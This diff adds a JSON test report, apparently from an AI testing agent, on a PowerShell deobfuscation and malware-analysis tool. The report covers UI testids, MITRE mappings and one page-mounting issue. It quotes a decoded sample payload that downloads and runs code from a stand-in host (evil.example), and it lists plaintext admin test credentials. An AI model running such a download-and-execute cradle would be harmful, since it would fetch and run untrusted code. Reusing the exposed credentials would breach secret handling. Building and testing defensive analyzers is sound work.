@@ -1,0 +1,37 @@
+{
+  "summary": "Iteration 44 verified the P0 unblock (frontend compile) + P1 (DeobfuscationChain + BehaviorStoryline UI) end-to-end on the preview URL. Frontend now compiles successfully (webpack: 'Compiled successfully'). Login as admin@nivxray.com works. On the /auto-investigate page: (A) the octal ASCII reconstruction payload from the review request triggers the full SemanticIntelligencePanel with semantic-v2-panel-0, semantic-v2-deob-0 (1 deterministic stage · boundary Invoke-Expression), and semantic-v2-story-0 present. All 8 storyline flag testids are rendered with 'observed'/'not observed' badges (initial_execution=observed, defense_evasion=observed, others=not observed). The MITRE roll-up (semantic-v2-story-mitre-all-0) shows T1027, T1027.010, T1059.001, T1564.003. The final decoded script surfaced in BOTH semantic-v2-story-final-0 AND semantic-v2-deob-final-0 contains the exact expected `Write-Host 'Hello, from PowerShell!'`. Executive Summary + Attack Narrative + Deobfuscation Chain summary + 4 Behavior Intelligence cards (Hidden Window Execution, Char-Array Join Obfuscation, PowerShell No-Profile Launch, Payload Decode) all render. Clicking semantic-v2-deob-toggle-0-0 expands to reveal semantic-v2-deob-before-0-0 ('127,162,151,164,145,55,...' octal integer array) and semantic-v2-deob-after-0-0 ('Write-Host \\'Hello, from PowerShell!\\''), proving the recursive Octal ASCII reconstruction stage is deterministic and evidence-linked. (B) The base64 EncodedCommand baseline payload renders initial_execution=observed + network_behavior=observed with MITRE T1059.001, T1071, T1071.001, T1105, T1620 in the roll-up and final decoded script = `Invoke-Expression (New-Object Net.WebClient).DownloadString('https://evil.example/x')` — matches the review-request expectation exactly. Zero page errors, zero console errors across both runs.",
+  "backend_issues": {"critical": [], "minor": []},
+  "frontend_issues": {
+    "ui_bugs": [],
+    "integration_issues": [
+      {
+        "flow": "Analyst Workspace (/) → AUTO INVESTIGATE button",
+        "issue": "SemanticIntelligencePanel is NOT mounted on the /workspace (root) page — only on /auto-investigate. Pasting the octal payload on the Workspace tab and clicking its AUTO INVESTIGATE runs the legacy chain analyzer (which returns 'Partial Decode · 25%') and NEVER emits any semantic-v2-* testid. The review request text says 'In the Analyst Workspace, pasting a PowerShell -EncodedCommand payload and clicking AUTO INVESTIGATE triggers the Semantic Intelligence panel to render' — that acceptance criterion only holds when the analyst is on the AUTO INVESTIGATE tab (grep confirms SemanticIntelligencePanel is imported ONLY by AutoInvestigatePage.jsx, not WorkspacePage.jsx). Either (a) mount SemanticIntelligencePanel on WorkspacePage as well, or (b) clarify docs/tests that the new panel lives on /auto-investigate.",
+        "affected_selectors": ["[data-testid^=semantic-v2-panel-]", "[data-testid^=semantic-v2-deob-]", "[data-testid^=semantic-v2-story-]"]
+      }
+    ],
+    "design_issues": []
+  },
+  "test_report_links": [
+    "/app/test_reports/screenshots/iter44_workspace.png",
+    "/app/test_reports/screenshots/iter44_octal_full.png",
+    "/app/test_reports/screenshots/iter44_octal_autoinv.png"
+  ],
+  "action_items": [
+    "Decide whether SemanticIntelligencePanel should also mount on WorkspacePage — currently it only renders on /auto-investigate. The review request wording implies it should render inside the Analyst Workspace as well."
+  ],
+  "critical_code_review_comments": [
+    "SemanticIntelligencePanel.jsx is now 832 lines and hosts 5 sub-components (DecodeFailureCard, DecodeTimeline, ExplainableVerdict, DeobfuscationChain, BehaviorStoryline) plus the panel export. Approaching the 700-line soft cap — split each sub-component into its own file under /components/investigation/semantic/ for maintainability.",
+    "The octal-reconstruction deob stage only produced ONE stage even though 'Recursive PowerShell Decode chain' was called out in the P0 requirement. Product-wise this is correct (a single Octal ASCII reconstruction is sufficient to reach the boundary op Invoke-Expression), but the panel header 'Recursive Deobfuscation · 1 deterministic stage' may under-sell the recursion story to SOC analysts on payloads that only need one pass. Consider a subtitle explaining 'recursion halted at fixed point / execution boundary'.",
+    "Workspace / AutoInvestigate feature parity: two different investigation UIs live in the same app and the new semantic panel is only wired into one of them — this is a discoverability trap for analysts.",
+    "ps_semantic.py still ~579 lines (flagged in iter43) — worth splitting into decode/normalize/behavior/storyline submodules."
+  ],
+  "updated_files": [],
+  "success_rate": {"backend": "not-tested (frontend-only run)", "frontend": "100% on /auto-investigate for both octal and base64 payloads"},
+  "test_credentials": "admin@nivxray.com / uulVDp5cCSB3Hva99s7UUAwK (from /app/memory/test_credentials.md)",
+  "seed_data_creation": "None — used the octal and base64 payloads from the review request.",
+  "retest_needed": false,
+  "main_agent_can_self_test": true,
+  "context_for_next_testing_agent": "The new DeobfuscationChain + BehaviorStoryline UI is fully functional on /auto-investigate (not on /workspace). Reliable testids to assert against: semantic-v2-panel-{i}, semantic-v2-deob-{i}, semantic-v2-deob-stages-{i}, semantic-v2-deob-stage-{i}-{j}, semantic-v2-deob-toggle-{i}-{j}, semantic-v2-deob-before-{i}-{j}, semantic-v2-deob-after-{i}-{j}, semantic-v2-deob-final-{i}, semantic-v2-deob-boundary-{i}, semantic-v2-deob-stop-{i}, semantic-v2-story-{i}, semantic-v2-story-exec-{i}, semantic-v2-story-final-{i}, semantic-v2-story-deobsum-{i}, semantic-v2-story-sections-{i}, semantic-v2-story-section-{key}-{i}, semantic-v2-story-flag-{key}-{i} (values: 'observed'|'not observed'), semantic-v2-story-mitre-{key}-{i}, semantic-v2-story-mitre-all-{i}, semantic-v2-story-narrative-{i}. Both review-request payloads (octal + base64) work end-to-end. Only remaining concern: SemanticIntelligencePanel not mounted on WorkspacePage.jsx.",
+  "rca of the issue": "N/A — no bugs found. The prior P0 (JSX parsing error 'Line 552:9') was already fixed by the main agent by re-adding DeobfuscationChain (lines 508-632) + BehaviorStoryline (lines 658-779) + a single default export. Webpack compiles cleanly now and both new components render as specified."
+}
